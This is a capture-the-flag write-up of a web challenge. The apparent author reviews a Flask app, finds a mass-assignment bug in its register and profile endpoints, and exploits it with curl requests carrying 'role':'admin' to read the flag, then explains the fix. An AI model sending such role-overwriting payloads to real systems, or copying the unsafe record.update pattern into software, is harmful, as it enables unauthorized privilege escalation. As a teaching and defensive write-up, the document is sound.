# A Massive Problem — Writeup

## Challenge Info
- **Category:** Web
- **Flag format:** `CIT{}`
- **Target:** `http://23.179.17.92:5556`
- **Given hint/context:**
  > Improper Authorization has been fixed! I think we are ready for production!

---

## Initial Approach
Since this was a web challenge and the user specifically mentioned that the source was provided in a zip file, the fastest path was:

1. Read the challenge context.
2. Extract the source code.
3. Review the application logic before spending time on blind fuzzing.
4. Identify the intended vulnerability.
5. Exploit it against the live target.

This is usually the best approach when source is available, especially for auth/authz bugs.

---

## Step 1: Read the provided context
I first read `context.txt` to learn the target URL and any hint.

### Observation
The file contained:
- A claim that **Improper Authorization has been fixed**
- The target URL: `http://23.179.17.92:5556`

This immediately suggested the challenge would likely involve:
- authentication,
- authorization,
- privilege escalation,
- or a flawed “fix” that still leaves a path open.

That wording is very common in CTFs where the developer fixed one obvious bug but left another related issue behind.

---

## Step 2: Extract the zip and inspect the source
I unzipped the source and found the important files:
- `app/app.py`
- `docker-compose.yml`
- `Dockerfile`
- `app/requirements.txt`

### Observation
The core logic was entirely in `app.py`, so that became the main focus.

---

## Step 3: Review the Flask application
The app is a simple Flask application using:
- session cookies,
- sqlite,
- registration/login/profile routes,
- and an `/admin` page.

### Key routes identified
- `/api/register`
- `/api/login`
- `/api/profile`
- `/admin`

The `/admin` route was the obvious goal because it returned the flag:

```python
@app.route('/admin')
def admin():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    return render_template('admin.html', username=session.get('username'), flag=os.getenv('FLAG', 'CIT{test_flag}'))
```

### Observation
To access the flag, I needed a valid session where:
- `session['username']` exists
- `session['role'] == 'admin'`

So the real question became: **Can I make the server assign me the `admin` role?**

---

## Step 4: Analyze the registration logic
The registration route was:

```python
@app.route('/api/register', methods=['POST'])
def register():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    username = incoming.get('username', '').strip()
    password = incoming.get('password', '')
    full_name = incoming.get('full_name', '').strip()
    title = incoming.get('title', '').strip()
    team = incoming.get('team', '').strip()
    if not username or not password or not full_name or not title or not team:
        return jsonify({'error': 'Please complete all required fields.'}), 400
    if not valid_password(password):
        return jsonify({'error': 'Password does not meet policy.'}), 400
    record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
```

### Important observation
This is the vulnerability.

The developer starts with a safe default:

```python
'role': 'standard'
```

but then immediately does:

```python
record.update(incoming)
```

That means **any user-controlled field in the JSON body can overwrite server-defined fields**, including `role`.

So even though the app appears to force new users to be `standard`, the attacker can just send:

```json
{"role":"admin"}
```

and overwrite that value.

This is a classic **mass assignment** bug (also called autobinding / overposting).

---

## Step 5: Confirm there was a second escalation path
The profile update endpoint had the same pattern:

```python
record = {
    'username': current['username'],
    'password': current['password'],
    'role': current['role'],
    'full_name': current['full_name'],
    'title': current['title'],
    'team': current['team']
}
record.update(incoming)
```

Later it writes the updated record back to the database:

```python
conn.execute(
    'update users set password = ?, role = ?, full_name = ?, title = ?, team = ? where username = ?',
    (record['password'], record['role'], record['full_name'], record['title'], record['team'], current['username'])
)
```

### Observation
Even if registration were fixed, an authenticated user could still update their own profile and submit `role=admin`.

So there were **two privilege escalation paths**:
1. Set `role=admin` during registration.
2. Register normally, then set `role=admin` through `/api/profile`.

The first one was simpler, so I used that.

---

## Step 6: Check supporting files for useful deployment information
I also checked the deployment configuration.

### `docker-compose.yml`
It showed:
- the service is exposed on port `5556`
- `SECRET_KEY` is set
- `FLAG` is set in the environment

### `Dockerfile`
It also confirmed the flag comes from an environment variable.

### Observation
This reinforced that the `/admin` route was definitely the intended flag sink.

The locally bundled value was `CIT{test_flag}`, but that is only a placeholder. The real deployed challenge instance would return the actual flag.

---

## Step 7: Build the exploit strategy
At this point the plan was very simple:

1. Register a new user.
2. Include an extra JSON field: `role: admin`.
3. Log in as that user.
4. Visit `/admin`.
5. Read the flag from the page.

### Why this works
- The registration endpoint inserts the user into the database with whatever `role` ends up in `record`.
- Because `record.update(incoming)` trusts attacker input, the database row is created as an admin user.
- During login, the app fetches the user’s role from the database and stores it into the session:

```python
session['username'] = user['username']
session['role'] = user['role']
```

- Once logged in, the session contains `role=admin`, which passes the `/admin` check.

---

## Step 8: Exploit the live service
I used `curl` with a cookie jar so the login session would persist.

### Registration request
```bash
curl -s -c cookie.txt -b cookie.txt \
  -H 'Content-Type: application/json' \
  -d '{
    "username":"ctfadmin_mass",
    "password":"Aa1!aaaa",
    "full_name":"CTF Solver",
    "title":"Admin",
    "team":"Red",
    "role":"admin"
  }' \
  http://23.179.17.92:5556/api/register
```

### Observation
The server responded with:

```json
{"redirect":"/login"}
```

That meant the registration was accepted successfully.

---

## Step 9: Log in with the newly created admin user
Next I logged in with the same credentials.

### Login request
```bash
curl -s -c cookie.txt -b cookie.txt \
  -H 'Content-Type: application/json' \
  -d '{
    "username":"ctfadmin_mass",
    "password":"Aa1!aaaa"
  }' \
  http://23.179.17.92:5556/api/login
```

### Observation
The server returned:

```json
{"redirect":"/dashboard"}
```

This indicated login succeeded and the session cookie now represented the authenticated user.

Because the role is loaded from the database at login time, this was the moment the forged `admin` role got copied into the session.

---

## Step 10: Access the admin page
Now that the session was authenticated, I requested `/admin` using the same cookie jar.

### Request
```bash
curl -s -L -c cookie.txt -b cookie.txt http://23.179.17.92:5556/admin
```

### Observation
The response was the admin page, not a redirect back to `/dashboard`.

Inside the HTML, the flag appeared in the flag section:

```html
<div class="flagbox">CIT{M@ss_@ssignm3nt_Pr1v3sc}</div>
```

So the final flag was:

```text
CIT{M@ss_@ssignm3nt_Pr1v3sc}
```

---

## Root Cause Analysis
The vulnerability is **mass assignment**.

### What mass assignment means here
The application accepts a JSON object from the user and merges it directly into a server-side record object:

```python
record.update(incoming)
```

This is dangerous because not every field in a server-side object should be writable by the client.

In this app, `role` is security-sensitive, but the code allowed the attacker to supply it anyway.

### Why the bug is serious
The `role` field directly controls access to `/admin`, which reveals the flag.

So this is not just a cosmetic bug. It is a full **privilege escalation** from a normal user to administrator.

---

## Why the hint makes sense
The hint said:

> Improper Authorization has been fixed!

This was probably meant to mislead toward the idea that `/admin` now correctly checks for `session['role'] == 'admin'`.

And that part is true — the authorization check itself exists.

However, the real bug is that the application still allows the attacker to **become admin in the first place** by abusing mass assignment.

So the authorization check is present, but the data feeding into it is attacker-controlled.

That is the “massive problem” in the challenge title.

---

## Alternative Exploit Path
A second working path exists through `/api/profile`.

### How it would work
1. Register a normal account.
2. Log in.
3. Submit a profile update request containing `role=admin`.
4. Log in again.
5. Access `/admin`.

Because `/api/profile` also does `record.update(incoming)`, it would allow changing the current user’s role as well.

I did not need to use this path because registration was already enough, but it is worth noting in the writeup.

---

## Minimal Reproduction
A compact reproduction of the exploit is:

```bash
# Register with role=admin
curl -s -c cookie.txt -b cookie.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn","password":"Aa1!aaaa","full_name":"Pwn User","title":"x","team":"x","role":"admin"}' \
  http://23.179.17.92:5556/api/register

# Login
curl -s -c cookie.txt -b cookie.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn","password":"Aa1!aaaa"}' \
  http://23.179.17.92:5556/api/login

# Get flag
curl -s -b cookie.txt http://23.179.17.92:5556/admin
```

---

## Fix / Remediation
To fix this properly, the application should never merge arbitrary user input into a privileged internal object.

### Bad pattern
```python
record.update(incoming)
```

### Safer pattern
Only copy fields that are explicitly allowed:

```python
record = {
    'username': username,
    'password': password,
    'role': 'standard',
    'full_name': full_name,
    'title': title,
    'team': team
}
```

and do **not** overwrite `role` from user input.

For profile updates, whitelist only editable profile fields, for example:
- password
- full_name
- title
- team

but never:
- role
- username
- any other authorization-sensitive field

### Additional hardening ideas
- Separate internal model fields from client-editable fields.
- Use form/schema validation with an explicit allowlist.
- Never trust JSON keys just because they are present.
- Add server-side tests to ensure a standard user cannot set their own role.

---

## Final Flag
```text
CIT{M@ss_@ssignm3nt_Pr1v3sc}
```

---

## Summary
### What I did
- Read `context.txt`
- Extracted the source zip
- Reviewed `app.py`
- Found a **mass assignment** issue in `/api/register`
- Noticed the same issue in `/api/profile`
- Registered a user with `role=admin`
- Logged in
- Accessed `/admin`
- Retrieved the flag

### Main observation
The app had an authorization check, but the role used by that check could still be controlled by the attacker through unsafe object merging.

That made the authorization logic meaningless.
